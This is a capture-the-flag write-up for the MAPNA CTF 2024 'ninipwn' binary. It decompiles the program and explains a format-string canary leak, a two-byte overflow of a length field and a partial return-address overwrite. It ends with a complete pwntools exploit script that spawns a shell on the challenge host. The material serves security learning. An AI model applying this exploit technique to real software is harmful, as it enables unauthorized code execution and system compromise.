Title: MAPNA CTF 2024 - ninipwn
Slug: ctf/mapna-2024/ninipwn
Date: 2024-01-21 18:00
Category: CTF

Running checksec against the binary:

>\> checksec ./ninipwn  
>\[\*] './ninipwn'  
    Arch:     amd64-64-little  
    RELRO:    Full RELRO  
    Stack:    **Canary found**  
    NX:       NX enabled  
    PIE:      PIE enabled  

the binary has all security settings enabled.

Running the binary with gdb and listing available symbols\*:

>\> gdb ./ninipwn  
>\> info symbol // then TAB TAB

Some interesting symbols are found:

![[ninipwn-symbols.png]]

Analyzing some symbols: 

![[ninipwn-symbols-analysis.png]]

\*Note: 30/01/2024 - there's a way better tool to list symbols from a binary - [[ret2win|see this]]

Decompiling the binary with Ghidra\*:

~~~java
void encryption_service(void)

{
  char *__buf;
  long in_FS_OFFSET;
  char **buffer** [264];
  long **canary**;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  printf("Text length: ");
  __isoc99_scanf(&DAT_00102016,&text_length);
  getchar();
  if ((text_length < 0) || (0x100 < text_length)) {
    puts("Text length must be less than 256");
  }
  else {
    printf("Key: ");
    read(0,&key,10); // <----- key has size 8, two-byte overflow into text_length!
    printf("Key selected: ");
	    printf((char *)&key); // <----- format string vulnerability, it's possible to leak stack addresses!
    putchar(10);
    printf("Text: ");
    __buf = buffer;
    read(0,__buf,(long)text_length);
    encrypt(buffer,(int)__buf);
    printf("Encrypted output: ");
    write(1,buffer,(long)text_length);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
~~~

\* Note: "buffer" and "canary" are just label set to ease code analysis, they're not the original symbols.

Binary performs a XOR encryption to all bytes starting from \*\_\_buf to \*\_\_buf + text_length:

~~~java
void encrypt(char *__block,int __edflag)

{
  int local_c;
  
  for (local_c = 0; local_c < text_length; local_c = local_c + 1) {
    __block[local_c] = *(byte *)((long)&key + (long)(local_c % 8)) ^ __block[local_c];
  }
  return;
}
~~~

The target will be the win function (*ret2win* challenge):

~~~java
void win(void)

{
  long in_FS_OFFSET;
  char *local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_28 = "/bin/sh";
  local_20 = 0;
  execve("/bin/sh",&local_28,(char **)0x0);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
~~~

The strategy will be the following:

- Bypass *text_length* check by overflowing the last two bytes of the *key*
- Leak the canary setting via the *key* exploiting the format string vulnerability
- Since it's not possible to leak *win* address, being the *ret address* near it, it's generally enough to override just the last byte.
- Apply the same XOR-ing to the canary and to the *win address last byte* otherwise the *encrypt* function will alter them; remember, XOR is the **invertible** i.e it's the reverse operation of itself - XOR(XOR("A",K),K)  = "A"

The solution is the following:

~~~python
from pwn import *
import sys

gdb_init= """
b encrypt
continue
"""

if len(sys.argv) > 1 and sys.argv[1] == "remote":
    p = remote("3.75.185.198", 7000)
else:
    p = gdb.debug("./ninipwn", gdb_init)


def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def overflow_text_length(key):
    global canary
       
    p.recvuntil(b"Text length: ")
    p.send(b"255\0")
    p.recvuntil(b"Key: ")
    p.send(key)
    leak = p.recvline().replace(b"Key selected: ",b"")
    canary = int(leak[2:18], 16)
    p.recvuntil(b"Text: ")

win_function_last_byte = 0x33
canary = b"C"*8
canary_leak = b"%39$p" # 39 is the number of addresses starting from the beginning of the stack

key = canary_leak + b"A"*3 

print('[!] Overflow 0x119 two-bytes into text_length...')
overflow_text_length(key + b"\x19\x01")
print(f'[!] Canary obtained! 0x{canary:02x}')

print('[!] XOR canary and win last byte...')
payload = b"A"*264 + byte_xor(p64(canary), key) + b"B"*8 + byte_xor(p8(0x33), key)
print('[!] Buffer overflow with canary and ret address last byte...')
p.send(payload)

p.interactive()
~~~

![[ninipwn-pwned.png]]